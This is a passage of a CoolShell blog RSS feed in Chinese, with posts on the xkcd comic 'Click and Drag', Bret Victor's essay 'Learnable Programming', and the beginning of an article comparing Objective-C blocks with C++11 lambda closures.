<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/17391.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2016/07/Community-150x150.jpg" alt="为什么我不在微信公众号上写文章" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17391.html" class="wp_rp_title">为什么我不在微信公众号上写文章</a></li><li ><a href="https://coolshell.cn/articles/17225.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2015/08/cuckoo-150x150.jpg" alt="Cuckoo Filter：设计与实现" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17225.html" class="wp_rp_title">Cuckoo Filter：设计与实现</a></li><li ><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/29.jpg" alt="Leetcode 编程训练" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a></li><li ><a href="https://coolshell.cn/articles/11847.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/08/puzzle-150x150.png" alt="谜题的答案和活动的心得体会" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11847.html" class="wp_rp_title">谜题的答案和活动的心得体会</a></li><li ><a href="https://coolshell.cn/articles/11832.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/08/538efefbgw1eiz9cvx78fj20rm0fmdi8-150x150.jpg" alt="【活动】解迷题送礼物" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11832.html" class="wp_rp_title">【活动】解迷题送礼物</a></li><li ><a href="https://coolshell.cn/articles/10590.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/10/QR-Code-Overview-150x150.jpeg" alt="二维码的生成细节和原理" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10590.html" class="wp_rp_title">二维码的生成细节和原理</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8422.html">TF-IDF模型的概率解释</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8422.html/feed</wfw:commentRss>
			<slash:comments>51</slash:comments>
		
		
			</item>
		<item>
		<title>xkcd 神图“Click and Drag”</title>
		<link>https://coolshell.cn/articles/8398.html</link>
					<comments>https://coolshell.cn/articles/8398.html#comments</comments>
		
		<dc:creator><![CDATA[陈皓]]></dc:creator>
		<pubDate>Tue, 16 Oct 2012 00:15:44 +0000</pubDate>
				<category><![CDATA[杂项资源]]></category>
		<category><![CDATA[轶事趣闻]]></category>
		<category><![CDATA[Programmer]]></category>
		<category><![CDATA[xkcd]]></category>
		<category><![CDATA[程序员]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8398</guid>

					<description><![CDATA[<p>xkcd对于经常浏览国外网站的朋友一定不会陌生。不过，还是先让我来介绍一下xkcd（维基百科词条）。这是一个漫画网站，它主要是发布一些很简单的随手画的漫画，它主...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8398.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8398.html">xkcd 神图“Click and Drag”</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script><a href="http://xkcd.com/" target="_blank">xkcd</a>对于经常浏览国外网站的朋友一定不会陌生。不过，还是先让我来介绍一下xkcd（<a href="http://en.wikipedia.org/wiki/Xkcd" target="_blank">维基百科词条</a>）。这是一个漫画网站，它主要是发布一些很简单的随手画的漫画，它主要有四种体裁——浪漫、讽刺、数学 和 语言。也会经常出现一些和IT有关的漫画，比如下面这个漫画—— （懂Unix的人一眼就看懂了，不懂的怎么看也看不懂）</p>
<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-8399" title="xkcd-sandwich" src="https://coolshell.cn/wp-content/uploads/2012/10/xkcd-sandwich.png" alt="" width="360" height="299" srcset="https://coolshell.cn/wp-content/uploads/2012/10/xkcd-sandwich.png 360w, https://coolshell.cn/wp-content/uploads/2012/10/xkcd-sandwich-300x249.png 300w, https://coolshell.cn/wp-content/uploads/2012/10/xkcd-sandwich-325x270.png 325w" sizes="(max-width: 360px) 100vw, 360px" /></p>
<p>本质上来说，xkcd是一种Geek文化，里面的东西都非常的Geek和晦涩，讽刺很辛辣，但很多只有特定人群可以看得懂。而且表达的形式自由到天马行空，飘忽不定。</p>
<p><span id="more-8398"></span></p>
<p>xkcd.com的网站创建者、所有的漫画的作者叫<a title="Randall Munroe" href="http://en.wikipedia.org/wiki/Randall_Munroe">Randall Munroe</a><img decoding="async" loading="lazy" class="alignright" title="Randall Munroe" src="http://upload.wikimedia.org/wikipedia/commons/thumb/f/f4/Randall_Munroe_ducks.JPG/230px-Randall_Munroe_ducks.JPG" alt="" width="230" height="343" />，他以前在 NASA工作，是那里的Roboticist——机器人专家，80后，同样，也是一个程序员。他还会画漫画。</p>
<p>xkcd是他于2005年创建的，他本来只是想把他大学里在记事本里画的漫画放到他的个人主页上，但结果却搞成了一个独立的以漫画为主的网站，他用他画的这些漫画做成T恤卖。为什么要取名叫xkcd，据Munroe说，这四个字母，没有任何意义，就是为了让人不能把他们通过拼成一个单词读出来。现在他全职在搞xkcd.com。他现在一周会更新三次漫画，分别在周一，周三，和周五。</p>
<p>到了2007年5月，xkcd上的漫画才被广泛转载。2008年10月， <em><a title="The New Yorker" href="http://en.wikipedia.org/wiki/The_New_Yorker">The New Yorker</a></em> 杂志对Munroe做了一个采访。</p>
<p>2010年3月，xkcd的书里的<a href="http://forums.xkcd.com/viewtopic.php?p=2042913#p2042829" target="_blank">谜底被解决了</a>，Munroe在旧金山的金门大桥公园里给他的Fans发了255本限量版的书。</p>
<p>2012年4月1日愚人节，他的1037 号漫画(&#8220;Umwelt&#8221;) 会根据不同的IP，浏览器和地址显示不同的漫画。</p>
<p>2012年9月19号，xkcd的第1110号图问世了。</p>
<h4>XKCD #1110 神图</h4>
<p>这个图上面就是三格小漫画，一个小人拿着气球，还有两句耐人寻味的话。而<strong>这三格漫画图的下面是一个风景图，取名 Click and Drag，也就是让你点住图片拖动。于是你就不能自拔了。</strong></p>
<p>我只所以在前面写了那么多东西，而不是把这个链接放在一开始，就是害怕你点了这个图，就再也不回来了。</p>
<p>好了，现在你可以点下面的链接开这个神图了 （你会发现这个图怎么也拖不完，无穷完尽的，所以，还请你先回来）<strong></strong></p>
<p style="text-align: center; font-size: 24px;"><strong> <a href="http://www.xkcd.com/1110/" target="_blank">Click and Drag</a></strong></p>
<p style="text-align: center;"><strong><span style="color: #cc0000;">但请你一定还要回来，本文后面还有精彩内容!</span></strong></p>
<p><strong>这个图一发布，几乎全世界的各大论坛都在疯狂的转载，很多媒体都关注这个漫画，各种技术社区如：reddit 在疯狂地讨论着这个图是怎么实现的，有多大？还有很多人再分析这个图里的内容，这个图里隐藏着很多很有意思的东西，《有2001太空漫游》，有《星球大战》，还有《超级马丽》等等。</strong></p>
<p style="text-align: center;"><strong>几乎整个互联网都沸腾了，但好像中国社区对此事完全不知。</strong></p>
<p>网上出现了很多相关的blog和站点来分析这个图片。如果你在Google里搜xkcd 1110，你会发现很多内容。</p>
<h4>这个图有多大</h4>
<ul>
<li>这个图可以分解成 2592 个 2048 x 2048 像素的图。</li>
</ul>
<ul>
<li>但其中只有 225 个 2048 x 2048 的PNG 图片文件。而剩下的2337 基本上是纯黑的或是纯白的块。比如地下和天空。</li>
</ul>
<ul>
<li>整个图横向有81个2048 x 2048的图（左边有33个，右边有48个），纵向有32个 2048 x 2048个图（天上有13个，地下有19个）</li>
</ul>
<ul>
<li>老大当晚Release的全尺寸的大图（比现在你看到的还要大），不算空白处，图片共有60G的像素，而如果要算上整个图将会是T级别的像素。现在你看到版本已被做过优化，不算空白处，只有1G的像素，而算上全图有10G的像素。 (2048x2048x225 = 943,718,400 和 2048x2048x2592 = 10,871,635,968).</li>
</ul>
<ul>
<li>如果我们按比例来看的话，图中的32个象素对应于现实世界的5英尺，那么，这个图的宽有25920英尺（7.9公里），高有10240英尺（3.1公里）。</li>
</ul>
<ul>
<li>如果每个 2048 x 2048 的PNG图可以被打印成一个300 dpi的宣传画，那么，这个宣传画基本上是14.05米宽，5.55米高的图。现在的PNG被调整过了，只有72dpi左右。</li>
</ul>
<p>有人说，创作这么这个大图很费时间。不过我觉得这对于Geek来说不是问题，因为这应该是可以通过矢量图的拼装来搞定。</p>
<figure id="attachment_8400" aria-describedby="caption-attachment-8400" style="width: 645px" class="wp-caption aligncenter"><a href="https://coolshell.cn/wp-content/uploads/2012/10/xkcd1110.png"><img decoding="async" loading="lazy" class=" wp-image-8400   " title="xkcd 1110全景缩略图（点击看大缩略图）" src="https://coolshell.cn/wp-content/uploads/2012/10/xkcd1110-1024x346.png" alt="xkcd 1110全景缩略图（点击看大缩略图）" width="645" height="218" srcset="https://coolshell.cn/wp-content/uploads/2012/10/xkcd1110-1024x346.png 1024w, https://coolshell.cn/wp-content/uploads/2012/10/xkcd1110-300x101.png 300w" sizes="(max-width: 645px) 100vw, 645px" /></a><figcaption id="caption-attachment-8400" class="wp-caption-text">xkcd 1110全景缩略图（点击看大缩略图）</figcaption></figure>
<h4>看看技术宅们干了什么</h4>
<p>下面我只记录了些不完全的技术宅们的因为这个画搞出来的东西。大家可以补充。</p>
<p style="padding-left: 30px;">1）如果你用鼠标翻得不爽的话，你可以<a href="http://www.potch.me/blog/press-and-hold.html" target="_blank">看看这篇文章</a>，在你的Chrome下按Ctrl+Shift+I，然后到Javascript控制台里，粘贴文中的代码，于是，你就可以用键盘的光标键移动并浏览整个世界了。</p>
<p style="padding-left: 30px;">2）这是个全屏版的：<a href="http://ares.aylett.co.uk/xkcd/" rel="nofollow">http://ares.aylett.co.uk/xkcd/</a></p>
<p style="padding-left: 30px;">3）如果你要下载所有的图，你可以使用这个<a href="http://lebbeo.us/static/get-xkcd-1110.py" target="_blank">Python脚本</a>来完成（<a href="http://lebbeo.us/2012/09/19/not-bbq-fetching-component-images-of-xkcd-comic-1110/" target="_blank">转自这篇文章</a>）</p>
<p style="padding-left: 30px;">4）还有人把它搞成了像Google Map一样的东西。 你可以访问下面的链接：</p>
<blockquote>
<ul>
<li><a href="http://xkcd-map.rent-a-geek.de/" target="_blank">http://xkcd-map.rent-a-geek.de/</a></li>
<li><a href="http://xkcdmap.webege.com/" target="_blank">http://xkcdmap.webege.com/ </a></li>
</ul>
<p>5）看看Hacker News的讨论贴吧，什么都有了（<a href="http://news.ycombinator.com/item?id=4542367" target="_blank">http://news.ycombinator.com/item?id=4542367</a>）</p></blockquote>
<p>当然，对于这个图最强的一个站点如下，解释了所有和这个图有关信息，包括图中的各种文字和图案的意思。</p>
<p style="text-align: center;"><a href="http://www.explainxkcd.com/wiki/index.php?title=1110:_Click_and_Drag" target="_blank">http://www.explainxkcd.com/wiki/index.php?title=1110:_Click_and_Drag</a></p>
<p style="text-align: left;">看到这个图后，我陷入了深深地沉思，我在想。是什么样的动力能让人干出这样的事来？兴趣，还是为了好玩。还就是为了证明他能干一些让人拍案叫绝的东西？<strong>这可能就是一种Geek精神吧。就是为了能做出让世人冿冿乐道的东西</strong>。</p>
<p style="text-align: left;">（全文完）</p>
<p><!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png" alt="聊聊团队协同和协同工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_title">聊聊团队协同和协同工具</a></li><li ><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png" alt="“一把梭：REST API 全用 POST”" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_title">“一把梭：REST API 全用 POST”</a></li><li ><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg" alt="谈谈公司对员工的监控" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_title">谈谈公司对员工的监控</a></li><li ><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg" alt="如何做一个有质量的技术分享" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a></li><li ><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png" alt="程序员如何把控自己的职业" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a></li><li ><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/01/remote-150x150.jpg" alt="MegaEase的远程工作文化" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8398.html">xkcd 神图“Click and Drag”</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8398.html/feed</wfw:commentRss>
			<slash:comments>54</slash:comments>
		
		
			</item>
		<item>
		<title>Bret Victor &#8211; Learnable Programming</title>
		<link>https://coolshell.cn/articles/8387.html</link>
					<comments>https://coolshell.cn/articles/8387.html#comments</comments>
		
		<dc:creator><![CDATA[陈皓]]></dc:creator>
		<pubDate>Sun, 14 Oct 2012 08:37:04 +0000</pubDate>
				<category><![CDATA[杂项资源]]></category>
		<category><![CDATA[程序设计]]></category>
		<category><![CDATA[编程语言]]></category>
		<category><![CDATA[Bret Victor]]></category>
		<category><![CDATA[Programmer]]></category>
		<category><![CDATA[Programming]]></category>
		<category><![CDATA[程序员]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8387</guid>

					<description><![CDATA[<p>大家是否还记得之前酷壳向大家介绍的苹果设计师Bret Victor一种可视编程的视频《Bret Victor – Inventing on Principle》...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8387.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8387.html">Bret Victor – Learnable Programming</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script>大家是否还记得之前酷壳向大家介绍的苹果设计师<a href="http://worrydream.com/" target="_blank">Bret Victor</a>一种可视编程的视频《<a href="https://coolshell.cn/articles/6775.html" rel="bookmark">Bret Victor – Inventing on Principle</a>》，最近，他写了一篇文章——<a href="http://worrydream.com/LearnableProgramming/" target="_blank"> Learnable Programming</a>，写这篇文章的原因是因为“可汗学院(Khan Academy)”近期上线的一个<a href="http://www.khanacademy.org/cs" target="_blank">在线编程环境</a>，根据他的演讲提供了一堆基于Javascript的“实时编程”的环境，因为这个环境是<a href="http://ejohn.org/blog/introducing-khan-cs" target="_blank">引用了他的想法</a>，所以，他有必要出来喷两句。</p>
<p>这篇文章的开头就是一个问题——“<em>How do we get people to understand programming?</em>”，我们怎么让人们懂得编程？</p>
<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-8389" title="Learnable_Programming" src="https://coolshell.cn/wp-content/uploads/2012/10/Learnable_Programming.jpg" alt="" width="650" height="207" srcset="https://coolshell.cn/wp-content/uploads/2012/10/Learnable_Programming.jpg 650w, https://coolshell.cn/wp-content/uploads/2012/10/Learnable_Programming-300x96.jpg 300w, https://coolshell.cn/wp-content/uploads/2012/10/Learnable_Programming-604x192.jpg 604w" sizes="(max-width: 650px) 100vw, 650px" /></p>
<p>然后，他说了两条——</p>
<ul>
<li><strong>编程是一种思考，而不是一种死记硬背的技能！</strong>你学会了“for循环”并不是说你就学会了编程，这就好像你知道有铅笔这个东西，但是你对绘画还是什么不懂。（对于这一条，正好这两天我在微博上和人辩论“<a href="http://weibo.com/1401880315/yFQkJn8bC" target="_blank">基础算法面试题是否好</a>”（还有<a href="http://weibo.com/1401880315/yFOeyy00M" target="_blank">微博一</a>，<a href="http://weibo.com/1401880315/z06Y0qMGf" target="_blank">微博二</a>），而且我以前也写过一篇《<a title="为什么我反对纯算法面试题" href="https://coolshell.cn/articles/8138.html" target="_blank">为什么我反对纯算法面试</a>》，这里借用Bret的话再加强一下我的观点——“<strong>我们一方面在骂中国的应试教育毁了学生，另一方面我们又在把我们的面试变成“考八股文”式的考试！  你会qsort有什么用？你只不过是会用一支高级铅笔而已罢了。</strong>”）</li>
</ul>
<ul>
<li><strong>人只有看得见，才能理解。</strong>如果一个程序员不能看到他的程序在干什么，那么她就不能理解程序。（对于这一条，让我想到了Donald Knuth的话——“An algorithm must be seen to be believe!”）</li>
</ul>
<p>所以，Bret 觉得编程软件的目标是——</p>
<p><span id="more-8387"></span></p>
<ul>
<li>支持并激发强大的思考。 To support and encourage powerful ways of thinking.</li>
<li>让程序员可以看得见程序的运行过程。To enable programmers to see and understand the execution of their programs</li>
</ul>
<p>他说，可汗学院的“实时编程环境”并没有达到上面的任何一个目标。他还说用Javascript这样设计得很垃圾的语言根本不能支持强大的思考，而且还忽略了近十年来的成果，可汗学院这些东西完全是毫无价值的。</p>
<p>Bret认为，Alan Perlis的名言——“要学会编程，你必需得同时变成机器和程序”是错误的，这句被广为流传的错误名言，让我们把编程变成很难，并且掩盖了编程的艺术。人并不是一台机器，我们也不应该强迫自己变成那样。</p>
<p>接下来，他说明了一个编程系统应该有两个部分——</p>
<ul>
<li><strong>编程的“环境”，是其中一部分需要安装在电脑上的。</strong></li>
</ul>
<ul>
<li><strong>编程的“语言”，是另一部分需要安装在程序员大脑里的。</strong></li>
</ul>
<p>他随笔给出来了一些Design Principles——</p>
<p>对于“<strong>编程环境</strong>”，应该能让学习者干下面的事：</p>
<ul>
<li><strong>阅读程序词汇 read the vocabulary</strong> <em>&#8212; </em>这些单词意味着什么？是不是显而易见不用思考的？是不是很自然地被上下文解释了？</li>
</ul>
<ul>
<li><strong>跟进流程 follow the flow</strong> <em>&#8212; </em>在什么时候会发生什么？流程的时间过程是不是看得见摸得着的？流程的粒度是否有意义？</li>
</ul>
<ul>
<li><strong>看见状态 see the state</strong> <em>&#8212; </em>电脑在想些什么？你能不能看到电脑里的数据？并可以看到不同状态的比较？没有任何状态会隐藏？</li>
</ul>
<ul>
<li><strong>通过交互来创造代码 create by reacting</strong> <em>&#8212; </em>从粗糙开始，然后开始雕琢程序。交互是否实时显示在屏幕上？有多少组件我可以用来做实时交互？</li>
</ul>
<ul>
<li><strong>通过抽像来创造代码 create by abstracting</strong> <em>&#8212; </em>从一些hard code开始，然后开始抽象成变量<em>，</em>抽象成公式，抽象成函数。从一个开始作模板，然后做多个不同的东西。</li>
</ul>
<p>对于“<strong>编程语言</strong>” 来说，它应该提供下面的事：</p>
<ul>
<li><strong>同一性和比方 identity and metaphor</strong> <em>&#8212; </em>我怎么把电脑的世界和我的世界联系起来?<em> </em>推荐了一本书《<em><a href="http://books.google.com/books?id=HhIEAgUfGHwC&amp;printsec=frontcover">&#8220;Mindstorms&#8221;</a></em>》</li>
</ul>
<ul>
<li><strong>分解 decomposition</strong> <em>&#8212; </em>怎么把我的想法分解成碎片？<em>how do I break down my thoughts into mind-sized pieces?</em></li>
<li><strong>重组 recomposition</strong> <em>&#8212; </em>怎么把这些碎片重组起来？<em> how do I glue pieces together?</em></li>
<li><strong>可读性 readability</strong> <em>&#8212; </em>这一大堆程序单词是什么意思？<em>what do these words mean?</em></li>
</ul>
<p>然后，他说“The Features are not the point”，<strong>我们很多时候会关注编程环境和编程语言提供的功能，这就好像我们在看一本书有哪些单词一样，有哪些单词不重要，重要的是我这些单词组合起来传达了一个什么信息</strong>？<strong>一个设计的好的系统并不是一堆功能，一个设计得好的编程环境是激发特定的思考方式</strong>。所有的功能都是非常小心翼翼地组合起来为之服务。（不好意思，我又要插一句。我觉得这和我在《<a title="抄袭，腾讯 和 产品" href="https://coolshell.cn/articles/7617.html" target="_blank">抄袭，腾讯和产品</a>》一文中，我所理解的“什么是真正的产品”有点类似——真正的产品不是功能的组合，而是要表达的价值和对某一特定问题端到端的解决方案）</p>
<p>接下来，Bret用大量的示例告诉了大家上面所说的那几条是具体是什么。大家一定要去读一读！（我把这些东西总结果在上面的那些条目中了）</p>
<p>最后，Bret说了一下，他被问过很多次——这些漂亮的想法怎么应用到现实世界中？他说这个问题问的是对的，但是这些问题问的就好像是——“怎么能让一匹马从内燃机引擎受益”一样，其假设的改变是错误的。他回答到，更准确的是——“<strong>Programming has to work like this</strong>”，所以他说，他的这些东西不是一种“Training”，也不是一种“银弹”，只不过是拿开了眼罩。</p>
<p><strong>更新：</strong>一楼回复的朋友给了一个中译版的链接：<a href="http://chengyichao.info/learnable-programming/">http://chengyichao.info/learnable-programming/</a></p>
<p>(全文完)<!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/07/1920px-Margaret_Hamilton_-_restoration-e1563697198766-1-150x150.jpg" alt="50年前的登月程序和程序员有多硬核" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a></li><li ><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/29.jpg" alt="Leetcode 编程训练" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a></li><li ><a href="https://coolshell.cn/articles/6775.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="Bret Victor &#8211; Inventing on Principle" width="150" height="150" /></a><a href="https://coolshell.cn/articles/6775.html" class="wp_rp_title">Bret Victor &#8211; Inventing on Principle</a></li><li ><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png" alt="聊聊团队协同和协同工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_title">聊聊团队协同和协同工具</a></li><li ><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png" alt="“一把梭：REST API 全用 POST”" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_title">“一把梭：REST API 全用 POST”</a></li><li ><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg" alt="谈谈公司对员工的监控" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_title">谈谈公司对员工的监控</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8387.html">Bret Victor – Learnable Programming</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8387.html/feed</wfw:commentRss>
			<slash:comments>33</slash:comments>
		
		
			</item>
		<item>
		<title>C/C++语言中闭包的探究及比较</title>
		<link>https://coolshell.cn/articles/8309.html</link>
					<comments>https://coolshell.cn/articles/8309.html#comments</comments>
		
		<dc:creator><![CDATA[Jason Lee]]></dc:creator>
		<pubDate>Thu, 20 Sep 2012 00:17:07 +0000</pubDate>
				<category><![CDATA[C/C++语言]]></category>
		<category><![CDATA[C++]]></category>
		<category><![CDATA[Closure]]></category>
		<category><![CDATA[Objective-C]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8309</guid>

					<description><![CDATA[<p>（感谢投稿人 @思禽饮霜 ） 这里主要讨论的是C语言的扩展特性block。该特性是Apple为C、C++、Objective-C增加的扩展，让这些语言可以用类L...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8309.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8309.html">C/C++语言中闭包的探究及比较</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script>（<strong><span style="color: #cc0000;">感谢投稿人</span> <a href="http://weibo.com/jasonmblog" target="_blank">@思禽饮霜</a> </strong>）</p>
<p>这里主要讨论的是C语言的扩展特性<a href="http://en.wikipedia.org/wiki/Blocks_(C_language_extension)" target="_blank">block</a>。该特性是Apple为C、C++、Objective-C增加的扩展，让这些语言可以用类Lambda表达式的语法来创建<a href="http://en.wikipedia.org/wiki/Closure_(computer_science)" target="_blank">闭包</a>。前段时间，在对CoreData存取进行封装时（让开发人员可以更简洁快速地写相关代码），我对block机制有了进一步了解，觉得可以和C++ 11中的Lambda表达式相互印证，所以最近重新做了下整理，分享给大家。</p>
<h4>0. 简单创建匿名函数</h4>
<p>下面两段代码的作用都是创建匿名函数并调用，输出Hello, World语句。分别使用Objective-C和C++ 11：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">^{ printf(&quot;Hello, World!\n&quot;); } ();</code><br />
<code data-enlighter-language="c" class="EnlighterJSRAW">[] { cout &lt;&lt; &quot;Hello, World&quot; &lt;&lt; endl; } ();</code></p>
<p>Lambda表达式的一个好处就是让开发人员可以在需要的时候临时创建函数，便捷。</p>
<p>在创建闭包（或者说Lambda函数）的语法上，Objective-C采用的是上尖号<span style="color: #ff0000;">^</span>，而C++ 11采用的是配对的方括号<span style="color: #ff0000;">[]</span>。</p>
<p>不过“<span style="color: #808000;">匿名函数</span>”一词是针对程序员而言的，编译器还是采取了一定的命名规则。</p>
<p>比如下面Objective-C代码中的3个block，</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
#import &lt;Foundation/Foundation.h&gt;

int (^maxBlk)(int , int) = ^(int m, int n){ return m &gt; n ? m : n; };

int main(int argc, const char * argv[])
{
    ^{ printf(&quot;Hello, World!\n&quot;); } ();

    int i = 1024;
    void (^blk)(void) = ^{ printf(&quot;%d\n&quot;, i); };
    blk();

    return 0;
}
</pre>
<p>会产生对应的3个函数：</p>
<p><span id="more-8309"></span></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
__maxBlk_block_func_0
__main_block_func_0
__main_block_func_1
</pre>
<p>可见函数的命名规则为：__<span style="color: #ff0000;">{$Scope}</span>_block_func_<span style="color: #ff0000;">{$index}</span>。其中{$Scope}为block所在函数，如果{$Scope}为全局就取block本身的名称；{$index}表示该block在{$Scope}作用域内出现的顺序（第几个block）。</p>
<h4>1. 从语法上看如何捕获外部变量</h4>
<p>在上面的代码中，已经看到“<span style="color: #808000;">匿名函数</span>”可以直接访问外围作用域的变量i：</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">
int i = 1024;
void (^blk)(void) = ^{ printf(&quot;%d\n&quot;, i); };
blk();
</pre>
